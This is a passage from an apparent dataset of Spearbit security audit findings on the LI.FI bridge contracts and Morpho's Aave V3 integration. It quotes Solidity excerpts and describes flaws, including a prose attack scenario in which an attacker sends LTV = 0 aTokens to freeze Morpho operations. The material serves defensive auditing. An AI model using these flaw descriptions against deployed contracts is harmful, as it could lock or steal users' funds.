LibAsset.maxApproveERC20( IERC20(dai), address(teleportGateway), _bridgeData.minAmount ); teleportGateway.initiateTeleport( l1Domain, _bridgeData.receiver, uint128(_bridgeData.minAmount) + );", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Low Risk"]}, {"title": "Cache s.anyTokenAddresses[_bridgeData.sendingAssetId]", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The function _startBridge() of MultichainFacet contains the following expresssion. This retrieves the value for s.anyTokenAddresses[_bridgeData.sendingAssetId] twice. It might save some gas to first store this in a tmp variable. s.anyTokenAddresses[_bridgeData.sendingAssetId] != address(0) ? ,! s.anyTokenAddresses[_bridgeData.sendingAssetId]: ...", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Gas Optimization"]}, {"title": "DeBridgeFacet permit seems unusable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The function deBridgeGate.send() takes a parameter permit. This can only be used if it's signed by the Diamond, see DeBridgeGate.sol#L654-L662. As there is no code to let the Diamond sign a permit, this function doesn't seem usable. function _startBridge(...) ... { ... deBridgeGate.send{ value: nativeAssetAmount }(..., _deBridgeData.permit, ...); ... }", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Gas Optimization"]}, {"title": "Redundant checks in CircleBridgeFacet", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The function swapAndStartBridgeTokensViaCircleBridge() contains both noNativeAsset() and onlyAllowSourceToken(). The check noNativeAsset() is not necessary as onlyAllowSourceToken() already verifies the sendingAssetId isn't a native token. 22 function swapAndStartBridgeTokensViaCircleBridge(...) ... { ... noNativeAsset(_bridgeData) onlyAllowSourceToken(_bridgeData, usdc) { ... } modifier noNativeAsset(ILiFi.BridgeData memory _bridgeData) { if (LibAsset.isNativeAsset(_bridgeData.sendingAssetId)) { revert NativeAssetNotSupported(); } _; } modifier onlyAllowSourceToken(ILiFi.BridgeData memory _bridgeData, address _token) { if (_bridgeData.sendingAssetId != _token) { revert InvalidSendingToken(); } _; }", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Gas Optimization"]}, {"title": "Redundant check on _swapData", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "This check is not present in the majority of the facets if (_swapData.length == 0) { revert NoSwapDataProvided(); } Ultimately, it's not required as _depositAndSwap() reverts when length is 0.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Gas Optimization"]}, {"title": "Duplicate checks done", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "In highlighted cases, a check has been done multiple times at different places:  validateBridgeData modifier on ArbitrumBridgeFacet. _startBridge() does checks already done by functions from which it's called.  depositAsset() does some checks already done by AmarokFacet.startBridgeTokensViaAmarok().", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Gas Optimization"]}, {"title": "calldata can be used instead of memory", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "When the incoming argument is constant, calldata can be used instead of memory to save gas on copying it to memory. This remains true for individual array elements.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Gas Optimization"]}, {"title": "Further gas optimizations for HopFacetOptimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "For the contract HopFacetOptimized it is very important to be gas optimized. Especially on Arbritrum, it is relatively expensive due to the calldata. 24 struct HopData { uint256 bonderFee; uint256 amountOutMin; uint256 deadline; uint256 destinationAmountOutMin; uint256 destinationDeadline; IHopBridge hopBridge; } struct BridgeData { bytes32 transactionId; string bridge; string integrator; address referrer; address sendingAssetId; address receiver; uint256 minAmount; uint256 destinationChainId; bool hasSourceSwaps; bool hasDestinationCall; } function startBridgeTokensViaHopL1ERC20( ILiFi.BridgeData calldata _bridgeData, HopData calldata _hopData ) external { // Deposit assets LibAsset.transferFromERC20(...); _hopData.hopBridge.sendToL2(...); emit LiFiTransferStarted(_bridgeData); } function transferFromERC20(...) ... { if (assetId == NATIVE_ASSETID) revert NullAddrIsNotAnERC20Token(); if (to == NULL_ADDRESS) revert NoTransferToNullAddress(); IERC20 asset = IERC20(assetId); uint256 prevBalance = asset.balanceOf(to); SafeERC20.safeTransferFrom(asset, from, to, amount); if (asset.balanceOf(to) - prevBalance != amount) revert InvalidAmount(); }", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Gas Optimization"]}, {"title": "payable keyword can be removed for some bridge functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "For the above highlighted functions, the native token is never forwarded to the underlying bridge. In these cases, payable keyword and related modifier refundExcessNative(payable(msg.sender)) can be re- moved to save gas.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Gas Optimization"]}, {"title": "AmarokData.callTo can be removed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "AmarokFacet's final receiver can be different from _bridgeData.receiver address receiver = _bridgeData.hasDestinationCall ? _amarokData.callTo : _bridgeData.receiver; Since both _amarokData.callTo and _bridgeData.receiver are passed by the caller, AmarokData.callTo can be removed, and _bridgeData.receiver can be assumed as the final receiver.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Gas Optimization"]}, {"title": "Use requiredEther variable instead of adding twice", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The cost and nativeAmount are added twice to calculate the requiredEther variable, which can lead to increased gas consumption.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Gas Optimization"]}, {"title": "refundExcessNative modifier can be gas-optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The highlighted code above can be gas-optimized by removing 1 if condition.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Gas Optimization"]}, {"title": "BridgeData.hasSourceSwaps can be removed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The field hasSourceSwaps can be removed from the struct BridgeData. _swapData is enough to identify if source swaps are needed.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Gas Optimization"]}, {"title": "Unnecessary validation argument for native token amount", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "Since both msg.value and feeAmount is controlled by the caller, you can remove feeAmount as an argument and assume msg.value is what needs to be collected. This will save gas on comparing these two values and refunding the extra.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Gas Optimization"]}, {"title": "Restrict access for cBridge refunds", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "cBridge refunds need to be triggered from the contract that sent the transaction to cBridge. This can be done using the executeCallAndWithdraw function. As the function is not cBridge specific it can do any calls for the Diamond contract. Restricting what that function can call would allow more secure automation of refunds.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "Stargate now supports multiple pools for the same token", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The Stargate protocol now supports multiple pools for the same token on the same chain, each pool may be connected to one or many other chains. It is not possible to store a one-to-one token-to-pool mapping.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "Expose receiver in GenericSwapFacet facet", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "Other than the bridge facets the swap facet does not emit the receiver of a transaction yet.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "Track the destination chain on ServiceFeeCollector", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "ServiceFeeCollector collects gas fees to send to the destination chain. For example /// @param receiver The address to send gas to on the destination chain function collectTokenGasFees( address tokenAddress, uint256 feeAmount, address receiver ) However, the destination chain is never tracked in the contract.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "Executor can reuse SwapperV2 functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "Executor.sol's noLeftOvers and _fetchBalances() is copied from SwapperV2.sol.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "Consider adding onERC1155Received", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "In addition to ERC721, NFTs can be created using ERC1155 standard. Since, the use case of purchasing an NFT has to be supported, support for ERC1155 tokens can be added.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "SquidFacet uses a different string encoding library", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "SquidFacet uses an OZ library to convert address to string, whereas the underlying bridge uses a different library. Fuzzing showed that these implementations are equivalent.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "Assembly in StargateFacet can be replaced with Solidity", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The function toBytes() contains assembly code that can also be replaced with solidity code. Also, see how-to-convert-an-address-to-bytes-in-solidity. 30 function toBytes(address _address) private pure returns (bytes memory) { bytes memory tempBytes; assembly { let m := mload(0x40) _address := and(_address,0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF) mstore(add(m, 20),xor(0x140000000000000000000000000000000000000000, _address) ) mstore(0x40, add(m, 52)) tempBytes := m } return tempBytes; }", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "Doublecheck quoteLayerZeroFee()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The function quoteLayerZeroFee uses msg.sender to determine a fee, while _startBridge() uses _bridgeData.receiver to execute  router.swap. This might give different results. function quoteLayerZeroFee(...) ... { return router.quoteLayerZeroFee( ... , toBytes(msg.sender) ); } function _startBridge(...) ... router.swap{ value: _stargateData.lzFee }(..., toBytes(_bridgeData.receiver), ... ); ... }", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "Missing modifier refundExcessNative()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The function swapAndStartBridgeTokensViaXDaiBridge() of GnosisBridgeFacet() and Gnosis- BridgeL2Facet() don't have the modifier refundExcessNative(). While other Facets have such a modifier.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "Special case for cfUSDC tokens in CelerIMFacet", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The function startBridgeTokensViaCelerIM() has a special case for cfUSDC tokens, whereas swapAndStartBridgeTokensViaCelerIM() doesn't have this. function startBridgeTokensViaCelerIM(...) ... { if (!LibAsset.isNativeAsset(_bridgeData.sendingAssetId)) { if (...) { // special case for cfUSDC token asset = IERC20(CelerToken(_bridgeData.sendingAssetId).canonical()); } else { ... } } ... } function swapAndStartBridgeTokensViaCelerIM(...) ... { ... if (!LibAsset.isNativeAsset(_bridgeData.sendingAssetId)) { // no special case for cfUSDC token } ... }", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "External calls of SquidFacet", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The functions CallBridge and CallBridgeCall do random external calls. This is done via a sepa- rate contract multicall SquidMulticall. This might be used to try reentrancy attacks. function _startBridge(...) ... { ... squidRouter.bridgeCall{ value: msgValue }(...); ... squidRouter.callBridgeCall{ value: msgValue }(...); ... }", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "Missing test coverage for triggerRefund Function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The current test suite does not include test cases for the triggerRefund function. This oversight may lead to undetected bugs or unexpected behavior in the function's implementation.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "Implicit assumption in MakerTeleportFacet", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The function _startBridge() of MakerTeleportFacet has the implicit assumption that dai is an ERC20 token. However on GnosisChain the native asset is (x)dai. Note: DAI on GnosisChain is an ERC20, so unlikely this would be a problem in practice. function _startBridge(ILiFi.BridgeData memory _bridgeData) internal { LibAsset.maxApproveERC20( IERC20(dai),...); ... }", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "Robust allowance handling in maxApproveERC20()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "Some tokens, like USDT, require setting the approval to 0 before setting it to another value. The function SafeERC20.safeIncreaseAllowance() doesn't do this. Luckily maxApproveERC20() sets the allowance so high that in practice this never has to be increased. function maxApproveERC20(...) ... { ... uint256 allowance = assetId.allowance(address(this), spender); if (allowance < amount) SafeERC20.safeIncreaseAllowance(IERC20(assetId), spender, MAX_UINT - allowance); }", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "Unused re-entrancy guard", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The RelayerCelerIM.sol#L21 includes a redundant re-entrancy guard, which adds an extra layer of protection against re-entrancy attacks. While re-entrancy guards are crucial for securing contracts, this particular guard is not used.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "Redundant duplicate import in the LIFuelFacet", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The current LIFuelFacet.sol contains a redundant duplicate import. Identifying and removing dupli- cate imports can streamline the contract and improve maintainability.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "Extra checks in executeMessageWithTransfer()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The function executeMessageWithTransfer() of RelayerCelerIM ignore the first parameter. seems this could be used to verify the origin of the transaction, which could be an extra security measure. It * @param * (unused) The address of the source app contract function executeMessageWithTransfer(address, ...) ... { }", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "Variable visibility is not uniform", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "In the current facets, state variables like router/messenger visibilities are not uniform, with some variables declared as public while others are private. thorchainRouter => is defined as public. synapseRouter => is defined as public. deBridgeGate => is defined as private", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "Library LibMappings not used everywhere", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The library LibMappings is used in several facets. However, it is not used in the following facets  ReentrancyGuard  AxelarFacet  HopFacet.sol  MultichainFacet  OptimismBridgeFacet  OwnershipFacet", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "transferERC20() doesn't have a null address check for receiver", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "LibAsset.transferFromERC20() has a null address check on the receiver, but transferERC20() does not.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "LibBytes can be improved", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The following functions are not used  concat()  concatStorage()  equal()  equalStorage()  toBytes32()  toUint128()  toUint16()  toUint256()  toUint32()  toUint64()  toUint8()  toUint96() The call to function slice() for calldata arguments (as done in AxelarExecutor) can be replaced with the in-built slicing provided by Solidity. Refer to its documentation.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "Keep generic errors in the GenericErrors", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "During the code review, It has been noticed that some of the contracts are re-defined errors. The generic errors like a WithdrawFailed can be kept in the GenericErrors.sol", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "Attention points for making the Diamond immutable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "There are additional attention points to decide upon when making the Diamond immutable: After removing the Owner, the following functions won't work anymore:  AccessManagerFacet.sol - setCanExecute()  AxelarFacet.sol - setChainName()  HopFacet.sol - registerBridge()  MultichainFacet.sol - updateAddressMappings() & registerRouters()  OptimismBridgeFacet.sol - registerOptimismBridge()  PeripheryRegistryFacet.sol - registerPeripheryContract()  StargateFacet.sol - setStargatePoolId() & setLayerZeroChainId()  WormholeFacet.sol - setWormholeChainId() & setWormholeChainIds() There is another authorization mechanism via LibAccess, which arranges access to the functions of  DexManagerFacet.sol  WithdrawFacet.sol Several Periphery contracts also have an Owner:  AxelarExecutor.sol  ERC20Proxy.sol  Executor.sol  FeeCollector.sol  Receiver.sol  RelayerCelerIM.sol  ServiceFeeCollector.sol Additionally ERC20Proxy has an authorization mechanism via authorizedCallers[]", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "Check on the final asset in _swapData", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "MakerTeleportFacet verifies that the final received asset in _swapData is DAI. This check is not present in majority of the facets (including CircleBridgeFacet). Ideally, every facet should have the check that the final receivingAssetId is equal to sendingAssetId.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "Discrepancies in pragma versioning across faucet implementations", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The use of different pragma versions in facet implementations can present several implications, with potential risks and compliance concerns that need to be addressed to maintain robust and compliant contracts.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "Inconsistent use of validateDestinationCallFlag()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "Highlighted code can be replaced with a call to validateDestinationCallFlag() function as done in other Facets.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "Inconsistent utilization of the isNativeAsset function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The isNativeAsset function is designed to distinguish native assets from other tokens within facet- based smart contract implementations. However, it has been observed that the usage of the isNativeAsset function is not consistent across various facets. Ensuring uniform application of this function is crucial for maintaining the accuracy and reliability of the asset identification and processing within the facets.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "Unused events/errors", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The contracts contain several events and error messages that are not used anywhere in the contract code. These unused events and errors add unnecessary code to the contract, increasing its size.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "Make bridge parameters dynamic by keeping them as a parameter", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The current implementation has some bridge parameters hardcoded within the smart contract. This approach limits the flexibility of the contract and may cause issues in the future when upgrades or changes to the bridge parameters are required. It would be better to keep the bridge parameters as a parameter to make them dynamic and easily changeable in the future. HopFacetOptimized.sol => Relayer & RelayerFee MakerTeleportFacet.sol's => Operator person (or specified third party) responsible for initiating minting process on destination domain by providing (in the fast path) Oracle attestations.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "Incorrect comment", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The highlighted comment incorrectly refers USDC address as DAI address.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "Redundant console log", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The contract includes Console.sol from test file, which is only used for debugging purposes. In- cluding it in the final version of the contract can increase the contract size and consume more gas, making it more expensive to deploy and execute.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "SquidFacet doesn't revert for incorrect routerType", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "If _squidData.routeType passed by the user doesn't match BridgeCall, CallBridge, or Call- BridgeCall, SquidFacet just takes the funds from the user and returns without calling the bridge. This, when the combined with the issue \"Max approval to any address is possible\", lets anyone steal those funds. Note: Solidity enum checks should prevent this issue, but it is safer to do an extra check.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "Side effects of LTV = 0 assets: Morpho's users will not be able to withdraw (collateral and \"pure\" supply), borrow and liquidate", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "When an AToken has LTV = 0, Aave restricts the usage of some operations. In particular, if the user owns at least one AToken as collateral that has LTV = 0, operations could revert. 1) Withdraw: if the asset withdrawn is collateral, the user is borrowing something, the operation will revert if the withdrawn collateral is an AToken with LTV > 0. 2) Transfer: if the from is using the asset as collateral, is borrowing something and the asset transferred is an AToken with LTV > 0 the operation will revert. 3) Set the reserve of an AToken as not collateral: if the AToken you are trying to set as non-collateral is an AToken with LTV > 0 the operation will revert. Note that all those checks are done on top of the \"normal\" checks that would usually prevent an operation, de- pending on the operation itself (like, for example, an HF check). While a \"normal\" Aave user could simply withdraw, transfer or set that asset as non-collateral, Morpho, with the current implementation, cannot do it. Because of the impossibility to remove from the Morpho wallet the \"poisoned AToken\", part of the Morpho mechanics will break.  Morpho's users could not be able to withdraw both collateral and \"pure\" supply  Morpho's users could not be able to borrow  Morpho's users could not be able to liquidate  Morpho's users could not be able to claim rewards via claimRewards if one of those rewards is an AToken with LTV > 0", "labels": ["Spearbit", "Morpho-Av3", "Severity: Critical Risk"]}, {"title": "Morpho is vulnerable to attackers sending LTV = 0 collateral tokens, supply/supplyCollateral, bor- row and liquidate operations could stop working", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "When an AToken has LTV = 0, Aave restricts the usage of some operations. In particular, if the user owns at least one AToken as collateral that has LTV = 0, these operations could revert 1) Withdraw: if the asset withdrawn is collateral, the user is borrowing something, the operation will revert if the withdrawn collateral is an AToken with LTV > 0 2) Transfer: if the from is using the asset as collateral, is borrowing something and the asset transferred is an AToken with LTV > 0 the operation will revert 3) Set the reserve of an AToken as not collateral: if the AToken you are trying to set as non-collateral is an AToken with LTV > 0 the operation will revert Note that all those checks are done on top of the \"normal\" checks that would usually prevent an operation, de- pending on the operation itself (like, for example, an HF check). In the attack scenario, the bad actor could simply supply an underlying that is associated with an LTV = 0 AToken and transfer it to the Morpho contract. If the victim does not own any balance of the asset, it will be set as collateral and the victim will suffer from all the side effects previously explained. While a \"normal\" Aave user could simply withdraw, transfer or set that asset as non-collateral, Morpho, with the current implementation, cannot do it. Because of the impossibility to remove from the Morpho wallet the \"poisoned AToken\", part of the Morpho mechanics will break.  Morpho's users could not be able to withdraw both collateral and \"pure\" supply. 6  Morpho's users could not be able to borrow.  Morpho's users could not be able to liquidate.  Morpho's users could not be able to claim rewards via claimRewards if one of those rewards is an AToken with LTV > 0.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Critical Risk"]}, {"title": "Morpho is not correctly handling the asset price in _getAssetPrice when isInEMode == true but priceSource is addres(0)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "The current implementation of _getAssetPrice returns the asset's price based on the value of isInEMode function _getAssetPrice(address underlying, IAaveOracle oracle, bool isInEMode, address priceSource) internal view returns (uint256) if (isInEMode) { uint256 eModePrice = oracle.getAssetPrice(priceSource); if (eModePrice != 0) return eModePrice; } return oracle.getAssetPrice(underlying); { } As you can see from the code, if isInEMode is equal to true they call oracle.getAssetPrice no matter what the value of priceSource that could be address(0). 7 If we look inside the AaveOracle implementation, we could assume that in the case where asset is address(0) (in this case, Morpho pass priceSource _getAssetPrice parameter) it would probably return _fallbackOra- cle.getAssetPrice(asset). In any case, the Morpho logic diverges compared to what Aave implements. On Aave, if the user is not in e-mode, the e-mode oracle is address(0) or the asset's e-mode is not equal to the user's e-mode (in case the user is in e-mode), Aave always uses the asset price of the underlying and not the one in the e-mode priceSource. The impact is that if no explicit eMode oracle has been set, Morpho might revert in price computations, breaking liquidations, collateral withdrawals, and borrows if the fallback oracle does not support the asset, or it will return the fallback oracle's price which is different from the price that Aave would use.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Critical Risk"]}, {"title": "Isolated assets are treated as collateral in Morpho", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "Aave-v3 introduced isolation assets and isolation mode for users: \"Borrowers supplying an isolated asset as collateral cannot supply other assets as collateral (though they can still supply to capture yield). Only stablecoins that have been permitted by Aave governance to be borrowable in isolation the mode can be borrowed by users utilizing isolated collateral up to a specified debt ceiling.\" The Morpho contract is intended not to be in isolation mode to avoid its restrictions. Supplying an isolated asset to Aave while there are already other (non-isolated) assets set as collateral will simply supply the asset to earn yield without setting it as collateral. However, Morpho will still set these isolated assets as collateral for the supplying user. Morpho users can borrow any asset against them which should not be possible:  Isolated assets are by definition riskier when used as collateral and should only allow borrowing up to a specific debt ceiling.  The borrows are not backed on Aave as the isolated asset is not treated as collateral there, lowering the Morpho Aave position's health factor and putting the system at risk of liquidation on Aave.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Critical Risk"]}, {"title": "Morpho's logic to handle LTV = 0 AToken diverges from the Aave logic and could decrease the user's HF/borrowing power compared to what the same user would have on Aave", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "The current implementation of Morpho has a specific logic to handle the scenario where Aave sets the asset's LTV to zero. We can see how Morpho is handling it in the _assetLiquidityData function function _assetLiquidityData(address underlying, Types.LiquidityVars memory vars) internal view returns (uint256 underlyingPrice, uint256 ltv, uint256 liquidationThreshold, uint256 tokenUnit) { ,! } // other function code... // If the LTV is 0 on Aave V3, the asset cannot be used as collateral to borrow upon a breaking withdraw. // In response, Morpho disables the asset as collateral and sets its liquidation threshold // to 0 and the governance should warn users to repay their debt. if (config.getLtv() == 0) return (underlyingPrice, 0, 0, tokenUnit); // other function code... The _assetLiquidityData function is used to calculate the number of assets a user can borrow and the maximum debt a user can reach before being liquidated. Those values are then used to calculate the user Health Factor. The Health Factor is used to  Calculate both if a user can be liquidated and in which percentage the collateral can be seized.  Calculate if a user can withdraw part of his/her collateral. The debt and borrowable amount are used in the Borrowing operations to know if a user is allowed to borrow the specified amount of tokens. On Aave, this situation is handled differently. First, there's a specific distinction when the liquidation threshold is equal to zero and when the Loan to Value of the asset is equal to zero. Note that Aave enforces (on the configuration setter of a reserve) that ltv must be <= of liquidationThreshold, this implies that if the LT is zero, the LTV must be zero. In the first case (liquidation threshold equal to zero) the collateral is not counted as collateral. This is the same behavior followed by Morpho, but the difference is that Morpho also follows it when the Liquidation Threshold is greater than zero. In the second case (LT > 0, LTV = 0) Aave still counts the collateral as part of the user's total collateral but does not increase the user's borrowing power (it does not increase the average LTV of the user). This influences the user's health factor (and so all the operations based on it) but not as impactfully as Morpho is doing. In conclusion, when the LTV of an asset is equal to zero, Morpho is not applying the same logic as Aave is doing, removing the collateral from the user's collateral and increasing the possibility (based on the user's health factor, user's debt, user's total collateral and all the asset's configurations on Aave) to  Deny a user's collateral withdrawal (while an Aave user could have done it).  Deny a user's borrow (while an Aave user could have done it).  Make a user liquidable (while an Aave user could have been healthy).  Increasing the possibility to allow the liquidator to seize the full collateral of the borrower (instead of 50%). 9", "labels": ["Spearbit", "Morpho-Av3", "Severity: High Risk MorphoInternal.sol#L324,"]}, {"title": "RewardsManager does not take in account users that have supplied collateral directly to the pool", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "Inside RewardsManager._getUserAssetBalances Morpho is calculating the amount of the supplied and borrowed balance for a specific user. In the current implementation, Morpho is ignoring the amount that the user has supplied as collateral directly into the Aave pool. As a consequence, the user will be eligible for fewer rewards or even zero in the case where he/she has supplied only collateral.", "labels": ["Spearbit", "Morpho-Av3", "Severity: High Risk"]}, {"title": "Accounting issue when repaying P2P fees while having a borrow delta", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "When repaying debt on Morpho, any potential borrow delta is matched first. Repaying the delta should involve both decreasing the scaledDelta as well as decreasing the 